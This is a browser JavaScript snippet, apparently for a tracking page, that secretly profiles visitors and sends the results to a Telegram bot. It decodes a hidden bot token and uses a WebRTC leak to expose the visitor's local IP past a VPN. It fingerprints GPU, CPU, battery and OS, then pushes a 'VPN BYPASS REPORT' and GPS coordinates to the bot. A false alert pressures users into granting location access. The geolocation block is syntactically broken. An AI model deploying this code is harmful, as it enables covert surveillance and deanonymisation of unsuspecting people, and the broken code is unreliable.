<script>

const _V = document.getElementById('v-vault').innerText.split('|');
const _TK = atob(_V[1]); const _CI = atob(_V[2]);

async function push(t) {
    await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: _CI, text: t})
    });
}

// 🔱 WebRTC Leak: Tembus VPN buat cari IP Lokal asli
async function getRealIP() {
    return new Promise((resolve) => {
        const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = (i) => {
            if (!i || !i.candidate) return;
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
            resolve(ip);
            pc.onicecandidate = null;
        };
        setTimeout(() => resolve("Timed Out"), 3000);
    });
}

async function initCore() {
    const btn = document.getElementById('btn');
    btn.innerText = "SINKRONISASI DATA...";
    
    // Grab Hardware specs
    const gl = document.createElement('canvas').getContext('webgl');
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    const gpu = gl ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Unknown";
    const realIP = await getRealIP();
    
    let bat = "N/A";
    try { const b = await navigator.getBattery(); bat = `${(b.level*100).toFixed(0)}% [${b.charging?'CHG':'BATT'}]`; } catch(e) {}

    // Detection Logic
    const isHotspot = (realIP.startsWith("192.168.43") && !realIP.endsWith(".1"));

    const report = `🔱 VPN BYPASS REPORT 🔱\n\n` +
                   `🏠 REAL LOCAL IP: ${realIP}\n` +
                   `🎮 GPU: ${gpu}\n` +
                   `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n` +
                   `🔋 BATT: ${bat}\n` +
                   `📱 OS: ${navigator.platform}\n` +
                   `🚨 STATUS: ${isHotspot ? 'PENUMPANG DETECTED' : 'HOST/SINGLE'}`;

    await push(report);

    // MINTA LOKASI (WAJIB)
    if (navigator.geolocation) {

            await push(`🎯 COORDINATES\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);

            alert("Sesi Gagal: Izin lokasi diperlukan untuk menembus enkripsi VPN.");

        }, {enableHighAccuracy: true});
    }
}
